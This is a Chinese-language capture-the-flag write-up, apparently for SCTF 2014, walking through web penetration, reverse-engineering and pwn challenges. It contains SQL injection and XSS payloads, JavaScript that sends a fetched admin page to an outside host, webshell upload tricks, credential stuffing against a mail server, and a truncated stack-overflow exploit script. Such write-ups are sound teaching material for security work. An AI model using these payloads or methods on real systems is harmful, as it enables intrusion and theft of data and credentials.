<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_19.png"><img class="alignnone size-full wp-image-2969" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_19.png" alt="sctf_writeup_19" width="554" height="334" /></a></p>
<p>FLAG：</p>
<p>SCTF{ &lt;TAB&gt;&lt;SPACE&gt;     }</p>
<p>&nbsp;</p>
<p>PS:本题是赛后才做出来的。我们队没有把这道题做出来，我们队以为又是SMB攻击。（另外最坑爹的是比赛时某位屌丝队友都用foremost拿到了rar还不说）</p>
<p>&nbsp;</p>
<h2>Misc400b</h2>
<div id="cha_content">别看妹子了，快做题。 <a href="http://download.sycsec.com/misc/fdf0677ddee76176887d31eb7503ef42.png" target="_blank">Download</a></div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 6/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<h2>PT100</h2>
<div>
<div id="cha_content">gintama.sycsec.com</div>
<div id="cha_score">Score: 100</div>
<div id="cha_ratio">Ratio: 38/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_20.png"><img class="alignnone size-full wp-image-2974" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_20.png" alt="sctf_writeup_20" width="1022" height="556" /></a></p>
</div>
<div>
<p>看来是要进入后台拿flag。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_21.png"><img class="alignnone size-full wp-image-2975" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_21.png" alt="sctf_writeup_21" width="971" height="545" /></a></p>
<p>后台可以很快猜出来，但是有个基础认证。</p>
<p>Cy大屌说他好像在哪里看到过iis+php可以绕过基础认证。</p>
<p>So我百度了一下，找到了相关的文章。成功绕过验证。</p>
<p>Microsoft IIS 6.0 with PHP installed Authentication Bypass<br />
http://www.exploit-db.com/exploits/19033/</p>
<p>访问</p>
<p><a href="http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php">http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php</a></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_22.png"><img class="alignnone size-full wp-image-2979" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_22.png" alt="sctf_writeup_22" width="720" height="267" /></a></p>
<p>接下来是一个不同寻常的注入点，利用的是false注入，在exploitdb上有相关的文章（PS:貌似是完全一样的代码哦，学习了。）</p>
<p>Referer：</p>
<p><a href="http://www.exploit-db.com/papers/18263/">http://www.exploit-db.com/papers/18263/</a></p>
<p>简单描述</p>
<pre class="lang:mysql decode:true ">表结构

/*

create database injection_db;

use injection_db;

create table users(num int not null, id varchar(30) not null, password varchar(30) not null, primary key(num));

 

insert into users values(1, 'admin', 'ad1234');

insert into users values(2, 'wh1ant', 'wh1234');

insert into users values(3, 'secuholic', 'se1234');

 

*** login.php ***

*/</pre>
<p>&nbsp;</p>
<pre class="lang:mysql decode:true  ">mysql&gt; select * from users;

+-----+-----------+----------+

| num | id        | password |

+-----+-----------+----------+

|   1 | admin     | ad1234   |

|   2 | wh1ant    | wh1234   |

|   3 | secuholic | se1234   |

+-----+-----------+----------+

3 rows in set (0.01 sec)

mysql&gt; select * from users where id='';

Empty set (0.00 sec)

mysql&gt; select * from users where id=0;

+-----+-----------+----------+

| num | id        | password |

+-----+-----------+----------+

|   1 | admin     | ad1234   |

|   2 | wh1ant    | wh1234   |

|   3 | secuholic | se1234   |

+-----+-----------+----------+

3 rows in set (0.00 sec)</pre>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>Id=0时可以列出所有的记录。</p>
<p>而注入点的语句是：</p>
<p>Select * from users where id=’+input+’ and password=’+input+’;</p>
<p>构造输入id=’-0%23&amp;password=123456</p>
<p>因为mysql的强制转换特性，该语句被这样理解了。</p>
<p>Select * from where id=’’-0# and password=’123456’;</p>
<p>Select * from users where id=(0-0)#</p>
<p>select * from users where id=0</p>
<p>那么就id里面输入<code>'-0#</code> 密码随便写</p>
<p>Payload：</p>
<pre class="lang:python decode:true ">http://gintama.sycsec.com//admin::$INDEX_ALLOCATION/index.php?id=%27%3D0%23&amp;password=123456#&amp;password=123456</pre>
<p>&nbsp;</p>
<p>成功拿到flag。</p>
<p>Flag: SCTF{Bypass_Auth_aNd_Easy_SQLi}</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_23.jpg"><img class="alignnone size-full wp-image-2982" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_23.jpg" alt="sctf_writeup_23" width="842" height="186" /></a></p>
<p>&nbsp;</p>
<h2>PT200</h2>
<p>kali.sycsec.com<br />
我们不是来要0DAY的，其实已经有公开的方法来bypass.<br />
tips:XSS+MySQL error-based PS:建议参赛人员使用最新版chrome测试<br />
Score: 200<br />
Ratio: 0/659<br />
Remain: 0/30</p>
<p>&nbsp;</p>
<p>有tip就是好，不用绕弯路了。</p>
<p>毕竟我们队友CTF专业空气队员@P总，直接给了我一个xss的payload。</p>
<p>首页查看源代码可以看到一个输出的测试页面。</p>
<p><code>&lt;!--index.php?name=xss--&gt;</code></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/kali_sctf_writeup.png"><img class="alignnone size-full wp-image-3093" src="http://www.secpulse.com/wp-content/uploads/2014/12/kali_sctf_writeup.png" alt="kali_sctf_writeup" width="679" height="290" /></a></p>
<p>然后~</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_23.png"><img class="alignnone size-full wp-image-2986" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_23.png" alt="sctf_writeup_23" width="826" height="456" /></a></p>
<p>Payload：<code>&lt;link rel=import href=http://test.com/test.php&gt;</code></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_24.png"><img class="alignnone size-full wp-image-2988" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_24.png" alt="sctf_writeup_24" width="930" height="455" /></a></p>
<p>Test.php的代码是</p>
<pre class="lang:php decode:true ">&lt;?php

header("Access-Control-Allow-Origin:*");

?&gt;

&lt;script&gt;alert(1)&lt;/script&gt;</pre>
<p>&nbsp;</p>
<p>马上开始打管理员的cookie。</p>
<p><a href="http://kali.sycsec.com/post.php">http://kali.sycsec.com/post.php</a>，这是一个留言板。</p>
<p>直接输入</p>
<p>&lt;link rel=import href=http://test.com/test.php&gt;</p>
<p>找了个xss平台，修改代码，提交，多输入几次打到了cookie。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_25.png"><img class="alignnone size-full wp-image-2990" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_25.png" alt="sctf_writeup_25" width="1074" height="378" /></a></p>
<p>不知道是成信院哪位大牛的电脑呢~</p>
<p>拿到了<a href="http://kali.sycsec.com/ebcb6eb2004d1f4086ef87cdf5d678c3/" target="_blank">后台地址</a>，挂上cookie，登陆。</p>
<p>发现居然403了。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_26.png"><img class="alignnone size-full wp-image-2991" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_26.png" alt="sctf_writeup_26" width="635" height="192" /></a></p>
<p>猜测是IP限制，又试了一下ip伪造。</p>
<p>结果。。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_27.png"><img class="alignnone size-full wp-image-2992" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_27.png" alt="sctf_writeup_27" width="619" height="145" /></a></p>
<p>好吧。。</p>
<p>想到写（zhao）了个js获取管理员页面的内容。</p>
<p>Js内容如下：</p>
<pre class="lang:js decode:true ">//构建xhrrequest包

function createXHR () {

var request = false;

if (window.XMLHttpRequest) {

    request = new XMLHttpRequest();

    if (request.overrideMimeType) {

        request.overrideMimeType('text/xml');

    }

} else if (window.ActiveXObject) {

     var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP',  'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0',  'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0',  'MSXML2.XMLHTTP'];

    for (var i = 0; i &lt; versions.length; i++) {

        try {

            request = new ActiveXObject(versions);

        } catch (e) {}

    }

}

return request;

}

//get方式

function get (xhr, url) {

    xhr.open("GET", url, false);

    xhr.send();

 

    return xhr.responseText;

}

 

var xhr = createXHR();

var x = get(xhr,'http://kali.sycsec.com/ebcb6eb2004d1f4086ef87cdf5d678c3/');

get(xhr,"http://test/login.php?key="+escape(x));</pre>
<p>&nbsp;</p>
<p>其中login.php是用于把传回的代码写入我本地的一个文件中。</p>
<p>返回结果如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_28.png"><img class="alignnone size-full wp-image-2996" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_28.png" alt="sctf_writeup_28" width="1334" height="242" /></a></p>
<p>根据题目的tip，这应该是一个报错注入。</p>
<p>使用了网络上的几个老的报错注入的payload，结果都没成功。（主办方自己写了一个过滤脚本）</p>
<p>&nbsp;</p>
<p>一些新型的报错注入payload又出现各种问题（我本机测试可以用的，服务器就不能用；服务器可以用的，我本机不能测试成功，因为主办方服务器mysql版本为5.1，我本机为5.6）</p>
<p>最终使用payload如下：</p>
<p>http://kali.sycsec.com/ebcb6eb2004d1f4086ef87cdf5d678c3/flag.php?id=1  and (select 1 from (select count(*),concat((select thisisflag from flag  limit 0,1),left(rand(),3))x from information_schema.tables group by x)  as yinfu)</p>
<p>过程不表，flag在当前库的flag表下thisisflag字段下。</p>
<p>修改js，给管理员发留言。</p>
<p>得到返回：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_29.png"><img class="alignnone size-full wp-image-2997" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_29.png" alt="sctf_writeup_29" width="675" height="177" /></a></p>
<p>FLAG：SCTF{x55_And_SqLinject}</p>
<p>PS：</p>
<p>报错注入payload大全：<a href="http://blackfan.ru/mysql_game_v2/">http://blackfan.ru/mysql_game_v2/</a></p>
<p>&nbsp;</p>
<h2>PT300</h2>
<div id="cha_content">Do you have 0day?<br />
Hint: Code Audit<br />
modx.sycsec.com</div>
<div id="cha_score">Score: 300</div>
<div id="cha_ratio">Ratio: 4/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<p>题目给了个 modx 的地址：<a href="http://modx.sycsec.com">modx.sycsec.com</a>，其中 modx 在 PT400 的 idc 中 download 目录有下载。题目提示是代码审计，看到 PKAV 分分钟搞定心慌啊。<br />
idc 上有三个版本，我选择了最新的版本审计，最后发现找错了，是 1.0.8。<br />
打开题目中的地址，从 robots.txt 中发现了 <code>/flag/flag.txt</code>，第一反应是文件包含。在 expdb 上搜索 modx 的 LFI 无果，决定自己审计。<br />
首先在本地搭建环境，<code>find . -name "*.php" | xargs grep include</code>找到含有 include 的文件。鬼使神差的从 <code>index-ajax.php</code> 开始跟（没想到跟对了）。<a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_30.jpg"><img class="alignnone wp-image-3001 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_30-1024x172.jpg" alt="sctf_writeup_30" width="1024" height="172" /></a>获取了用户输入的 q 参数，然后进行包含。阅读代码发现需要在 <code>assets/snippets</code> 目录下，再次目录下查找有包含的 php，发现<code>/ajaxSearch/ajaxSearchPopup.php</code>存在包含：<a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_31.jpg"><img class="alignnone wp-image-3002 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_31-1024x144.jpg" alt="sctf_writeup_31" width="1024" height="144" /></a>如果 POST 了 ucfg，如果开头为<code>@FILE:</code>就包含用户提交的 ucfg。构造 payload：</p>
<pre class="lang:php decode:true">q=assets/snippets/ajaxSearch/ajaxSearchPopup.php&amp;as_version=1.9.2&amp;ucfg=%26config%3D%60@FILE:flag%2fflag.txt%60&amp;search=123</pre>
<p>POST 到 index-ajax.php 得到 flag。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_32.jpg"><img class="alignnone wp-image-3003 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_32-1024x553.jpg" alt="sctf_writeup_32" width="1024" height="553" /></a></p>
<p><span style="color: #ff6600;">SCTF{0day_15_s0_good}</span> {"res":"</p>
<div class="\&quot;AS_ajax_resultsIntroFailure\&quot;">There were no search results. Please try using more general terms to get more results.</div>
<p>","resnb":"0,0","ctgnm":"","ctgnb":""}</p>
<p>&nbsp;</p>
<h2>PT400</h2>
<div id="cha_content">Plz hack into this Blog!<br />
http://blog.sycsec.com/fc0ea94c722b1fd7f9257f3087ac45d1/<br />
Hint：SQLi -&gt; XSS</div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 3/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<p>渗透一个 WordPress 的博客。wpscan 扫了下没有插件主题，官方也说不是爆破口令。</p>
</div>
<div>在页面尾部发现自豪的采用了 SYC SERVICE，打开后是<a href="http://idc.sycsec.com/">http://idc.sycsec.com/</a>。</div>
<div>发现 page 疑似注入，<a href="http://idc.sycsec.com/images/bug.php">bug 反馈</a>疑似 XSS。第一天没搞定，第二天官方提示 SQLi -&gt; XSS。这个神脑洞o~o...<br />
page 注入通过把空格替换成 %0a 绕过，然后提交 payload：</p>
<pre class="">http://idc.sycsec.com/?page=1%0aunion%0aselect%0a0x3c736372697074207372633d687474703a2f2f7873732e72652f353233323e3c2f7363726970743e</pre>
<p>获得后台地址：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_33.jpg"><img class="alignnone size-full wp-image-3005" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_33.jpg" alt="sctf_writeup_33" width="1336" height="270" /></a></p>
<p>然后通过注入得到管理员的账号和密码：</p>
<pre class="">http://idc.sycsec.com/?page=-1%0aunion%0aselect%0aconcat(UserPass,0x3b,UserName,0x3b,IsAdmin)from%0aadministrators123%0alimit%0a0,1%23</pre>
<p>查看源码 得89479a64d0965246c032d813efd7d360;administratoroot;1</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/somd5_sctf.png"><img class="alignnone size-large wp-image-3107" src="http://www.secpulse.com/wp-content/uploads/2014/12/somd5_sctf-1024x425.png" alt="somd5_sctf" width="1024" height="425" /></a></p>
<p>&nbsp;</p>
<p>管理员的 md5 搜一下得到：<code>rootadministrator123</code>，登陆后跳到 upload.php。<br />
这里的上传的图片有一个过滤，当图片包含<code>&lt;?</code>的时候，对，你没有看错，有<code>&lt;?</code>的时候，张全蛋（英文名Michael Jack，法文名Hélodie Jaqueline）就会出现。不过很容易的，PHP 也可以通过<code>&lt;script language=php&gt;phpinfo();&lt;/script&gt;</code>来执行。直接上传一句话，%00 截断之后得到地址，菜刀连接就好，轻车熟路</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_34.jpg"><img class="alignnone size-full wp-image-3007" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_34.jpg" alt="sctf_writeup_34" width="998" height="430" /></a></p>
<p>根目录下发现 WordPress 的源码，目测这个源码留了后门。下载下来 diff 一下，果然：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_35.jpg"><img class="alignnone wp-image-3008 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_35-1024x657.jpg" alt="sctf_writeup_35" width="1024" height="657" /></a></p>
<p>数了数这是 6 个字符，那就是<code>assert</code>了，写了个脚本来爆破..</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_36.png"><img class="alignnone wp-image-3009 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_36-1024x454.png" alt="sctf_writeup_36" width="1024" height="454" /></a></p>
<p>这个脚本真是醉了..不过跑出来就行。跑了一堆，随便选一个：<code>Q0C6S1E</code><br />
然后再写一个脚本中转：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_37.jpg"><img class="alignnone wp-image-3010 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_37-1024x296.jpg" alt="sctf_writeup_37" width="1024" height="296" /></a></p>
<p>运行后连接一句话，在数据库里找到 flag：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_38.jpg"><img class="alignnone wp-image-3011 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_38-1024x366.jpg" alt="sctf_writeup_38" width="1024" height="366" /></a></p>
<p>&nbsp;</p>
<h2>PT500</h2>
<div id="cha_content">渗透进三叶草花卉公司，寻找一个名为torrent的文件 公司网址：corp.sycsec.com</div>
<div id="cha_score">Score: 500</div>
<div id="cha_ratio">Ratio: 4/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<p>渗透题最爱。在 <a href="http://corp.sycsec.com/">http://corp.sycsec.com/</a> 搜集各种信息。</p>
</div>
<div><a href="http://corp.sycsec.com/news.html">http://corp.sycsec.com/news.html</a>  页面信息量很大</div>
<div><a href="http://www.secpulse.com/wp-content/uploads/2014/12/SYC083.jpg"><img class="alignnone size-full wp-image-3112" src="http://www.secpulse.com/wp-content/uploads/2014/12/SYC083.jpg" alt="SYC083" width="403" height="600" /></a></div>
<div>
<pre class="lang:php decode:true ">&lt;!-- 你一定是DiaoSi程序员吧，否则怎么会找到这里，妹子的邮箱是 happy_net@163.com --&gt;
Email: happy_net@163.com/SYC083
6603号寝室 刘明(工号 SYC071) 
Domain: file.sycsec.com
Domain: report-man.sycsec.com</pre>
<p>查找一下社工裤找到密码为：971989823，接着登陆进去。</p>
<p>只有一个上传，我还以为能 getshell，后来发现想多了。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sycsec_syc083.png"><img class="alignnone size-full wp-image-3114" src="http://www.secpulse.com/wp-content/uploads/2014/12/sycsec_syc083.png" alt="sycsec_syc083" width="590" height="251" /></a></p>
<pre class="lang:python decode:true ">&lt;script&gt;alert('l.lol upload success.');window.location='index.php';&lt;/script&gt;</pre>
<p>&nbsp;</p>
<p>卡了一会脑洞一开，想起来文件名可以注入。试了试果然，写了个脚本跑出来所有的用户数据。脚本如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_39.jpg"><img class="alignnone wp-image-3013 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_39-1024x220.jpg" alt="sctf_writeup_39" width="1024" height="220" /></a></p>
<p>用户数据如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_40.jpg"><img class="alignnone size-full wp-image-3014" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_40.jpg" alt="sctf_writeup_40" width="1014" height="254" /></a></p>
<p>之后又卡住了..不过机会总会来的，想起以前做渗透的时候经常社工公司邮箱，而且这里的人的邮箱也是<code>@sycsec.com</code>的，所以顺手打了个 mail.sycsec.com，成功访问。</p>
<p>经过撞库登陆成功 SYC081 和 SYC042 的账号。</p>
<p><code>xiaoxi@sycsec.com 19930221<br />
liuming@sycsec.com liuming123</code></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/mail.sycsec.com_secpulse.png"><img class="alignnone size-full wp-image-3123" src="http://www.secpulse.com/wp-content/uploads/2014/12/mail.sycsec.com_secpulse.png" alt="mail.sycsec.com_secpulse" width="800" height="490" /></a></p>
<p>&nbsp;</p>
<p>邮件内容挺逗的 胖编发出来玩玩：</p>
<pre class="">发件人：老板 [boss@sycsec.com]
时间： 2014-12-01
===================================
小夕，上个月表现的不错，这个月也要好好努力呀!
如果这个月能表现的更好，我就给你加薪哟 <img src="https://www.secpulse.com/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />


回复：
===================================
嗯嗯嗯，谢谢老板，我这个月保证不会迟到10次的



发件人：Information Tech [IT@sycsec.com]
时间： 2014-11-25
===================================
通知:
我们的VPN系统出现了问题，现在换成了旧版本系统，可能操作不太方便
但是大家先暂时忍受一下，我们会即使处理该问题的，谢谢合作

Information Tech
Do not Reply



发件人：爸爸 [yourfather@aol.com]
时间： 2014-11-23
===================================
小夕，家里出事了，你妈妈生病了，现在卧病在床，急需资金
速汇款到 6678789768123746583

回复：
===================================
你是逗B吗?
我家里会缺钱?
信不信我用钱砸死你，哼。。


发件人：刘得滑 [liudehua@sycsec.com]
时间： 2014-11-22
===================================
小夕，我是德华哥哟，我的手机前几天掉了，昨天才买了个肾6，我把你的号码忘了，重新发给我嘛

回复：
===================================
额，我不记得我以前给过你号码啊。。。
想要骗我给你号码？Too young too simple
( *・ω・)✄╰ひ╯



发件人：Information Tech [IT@sycsec.com]
时间： 2014-11-20
===================================
通知:
最近文件共享服务器受到源于内部的暴力破解攻击，现在未确定攻击者
请大家切记把密码改复杂！防止资料泄漏！

Information Tech
Do not Reply


发件人：小七 [xiaoqi@sycsec.com]
时间： 2014-09-22
===================================
夕，这周六就是小美的生日了，你的礼物准备的什么啊？

回复
===================================
小美妹子么，看姐姐送她一包辣条压压惊:)



发件人：Information Tech [IT@sycsec.com]
时间： 2014-09-01
===================================
通知:
公司VPN地址：vpn.sycsec.com
默认用户名：工号 (如：SYC001)
默认登录密码：工号 + 生日 (如：工号为SYC001，生日为19900101的用户，密码为：SYC001900101)

Information Tech
Do not Reply



</pre>
<p>在邮件里得到 VPN 的地址和密码组成。</p>
<pre class="">通知:
公司VPN地址：vpn.sycsec.com
默认用户名：工号 (如：SYC001)
默认登录密码：工号 + 生日 (如：工号为SYC001，生日为19900101的用户，密码为：SYC001900101)</pre>
</div>
</div>
</div>
</div>
</div>
</div>
<p>在 SYC081 得到提示小美的生日，爆破了一下出生年份，最后进入 VPN 系统。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_41.jpg"><img class="alignnone wp-image-3016 size-large" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_41-1024x452.jpg" alt="sctf_writeup_41" width="1024" height="452" /></a></p>
<p>http://vpn.sycsec.com/login.php<br />
SYC079<br />
SYC079940927</p>
<p>接着利用 VPN 访问内网的<code>file.sycsec.com</code>，发现域名不能访问，改为 IP 即可。</p>
<p>Ping file.sycsec.com [10.24.13.37]<br />
这题的坑点在于，存在一个 .svn 目录让人遐想联翩，login.php 又让人登陆。不过我试了试都不行，然后爆破了下目录..发现存在 files 目录...<br />
想到了爆破备份文件，没找到，又尝试了下用户名，依然 GG。最后没辙了爆破了下工号，发现是 403。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_42.jpg"><img class="alignnone size-large wp-image-3017" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_42-1024x437.jpg" alt="sctf_writeup_42" width="1024" height="437" /></a></p>
<p>嗯，写脚本跑www</p>
<pre class="lang:python decode:true ">import requests
headers = {
    'Cookie': 'PHPSESSID=cfefaa8e1d72885a3de880a9c9c55337'
}
url = 'http://vpn.sycsec.com/curl.php'
url_2 = 'http://10.24.13.37/files/'
data = {
    'option': 'GET',
    'url': '',
    'cookie': '',
    'post': '',
}
for i in range(0,84):
    data['url'] = '%sSYC0%02d/' % (url_2, i)
    print 'Forbidden' in requests.post(url, headers=headers, data=data).content, i</pre>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_43.jpg"><img class="alignnone size-full wp-image-3018" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_43.jpg" alt="sctf_writeup_43" width="698" height="420" /></a></p>
<p>最后在 SYC007 处得到 flag。</p>
<p>http://10.24.13.37/files/SYC007/torrent</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_44.jpg"><img class="alignnone wp-image-3019 size-full" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_44.jpg" alt="sctf_writeup_44" width="852" height="608" /></a></p>
<p>得到flag：SCTF{FuNny_Pene7ration_Test}</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>RE50</h2>
<div id="cha_content">听说逆向都挺难的，这里有个简单的，快来秒~~~ 😀<br />
<a href="http://download.sycsec.com/re/1826e2db45e6e4ca721e19f31d8566dc" target="_blank">Download</a></div>
<div id="cha_score">Score: 50</div>
<div id="cha_ratio">Ratio: 66/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_45.jpg"><img class="alignnone size-full wp-image-3022" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_45.jpg" alt="sctf_writeup_45" width="266" height="214" /></a></div>
<div>
<p>如图,将输入的字符串每位加3后作比较</p>
<p>s=“6duFg3rJ”[::-1]</p>
<p>for i in s:</p>
<p>print chr(ord(i)-3),</p>
<p>&nbsp;</p>
<p>脑补一个‘k’</p>
<p>Flag=SCTF{Go0dCra3k}</p>
</div>
<p>&nbsp;</p>
<h2>RE200</h2>
<div id="cha_content">这个FLAG有点怪，格式是xctf{*****}<br />
Hint：反调试、关键点在init段<br />
<a href="http://download.sycsec.com/re/4c267e173ca052148c259b7e0ac2bf86.apk" target="_blank">Download</a></div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 2/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div>
<p>下载下来是个APK文件。解压，Dex2jar反编译，得到源码，看MainActivity.java分析关键位置，可以看出func函数返回为真，则可toast出Flag。</p>
<p>于是分析func函数，先解密各个字符串，基本上都是-1，-2，-3简易加密的。</p>
<p>输入的字串，第一次变换是与自己所在的标号异或。第二次变换可能是syc（对应长度为6）和xctf（对应长度为9）两种之一，做了下移位。</p>
<p>第三次变换是对大写字母，小写字母，和除此之外其他情况做了处理，得到的字符串的前11位可以通过解方程得到，GoodCracK3R。</p>
<p>11位之后的数，经过处理后又和a8e5588f7e3f758比较，相等才返回1，总共15位，那肯定是8位输入，对应15或16位，于是把这8位跑了一下，测试了下结果。</p>
<p>和前面的GoodCracK3R结合起来，为"GoodCracK3R;{0jN|B6"，然后倒推第二次变换和第一次变换，就可推出KEY</p>
<p>FLAG：xctf{hgJ7Q=|8a\wV;A~}}Wc}</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_46.png"><img class="alignnone size-full wp-image-3034" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_46.png" alt="sctf_writeup_46" width="212" height="365" /></a></p>
<p>&nbsp;</p>
<h2>RE300</h2>
<div id="cha_content"><a href="http://download.sycsec.com/re/0dd72bc089d0d89273c28859373af2ed.exe" target="_blank">Download</a><br />
FLAG格式: SCTF{你获得的字符串}<br />
Hint：三阶魔方 还原步骤</div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 0/659</div>
<div id="cha_remain">Remain: 0/30</div>
<p>&nbsp;</p>
<h2>RE500</h2>
<div id="cha_content"><a href="http://download.sycsec.com/re/88520da54e15fc90733bff5857c0709c.exe" target="_blank">Download</a><br />
Hint: LUA虚拟机 Lua字节码 ShellCode<br />
FLAG格式: SCTF{你获得的字符串}</div>
<div id="cha_score">Score: 500</div>
<div id="cha_ratio">Ratio: 0/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div></div>
<div></div>
<h2>Pwn200</h2>
<div></div>
<div>
<div id="cha_content">nc 218.2.197.248 10001<br />
<a href="http://download.sycsec.com/pwn/2be21b477b39c1e7277b048960547e3e.zip" target="_blank">Download</a></div>
<div id="cha_score">Score: 200</div>
<div id="cha_ratio">Ratio: 33/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div id="cha_input"></div>
<div></div>
<div>
<p>程序需要两次输入，第一次的输入有一字节的溢出，可以修改第二次输入的长度。</p>
</div>
<div><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_47.png"><img class="alignnone size-full wp-image-3039" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_47.png" alt="sctf_writeup_47" width="483" height="177" /></a></div>
<div>
<p>程序后面有个strlen判断输入长度，用/x00截断即可绕过。经过以一次一字节溢出修改nbytes变量大小，修改后第二次输入出现栈溢出。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_48.png"><img class="alignnone size-full wp-image-3040" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_48.png" alt="sctf_writeup_48" width="519" height="317" /></a></p>
<p>Exp如下：</p>
<pre class="lang:python decode:true">#coding:utf-8

__author__ = 'Dazdingo'

 

from socket import *

import struct

import time

import threading

import sys

 

is_recv = True

 

sock_host = '192.168.206.130'

sock_port = 8080

 

S = socket(AF_INET, SOCK_STREAM)

 

def send(ss, tail = ''):

  global S
  if tail:
    ss += tail
  print ss
  S.send(ss)

 

def outputrecv():

  global S

  while 1:
    if is_recv:
      i =  S.recv(1024)
      if i:
        sys.stdout.write(i)

 

def start_recv():

  #start recv
  t = threading.Thread(target = outputrecv,  args = ())
  t.daemon = True
  t.start()

 

def get_shell():

  #start recv
  start_recv()

 

  global S

  while 1:
    time.sleep(0.1)
    ss = raw_input() + '\n'
    S.send(ss)

 

 

def main():
  global S


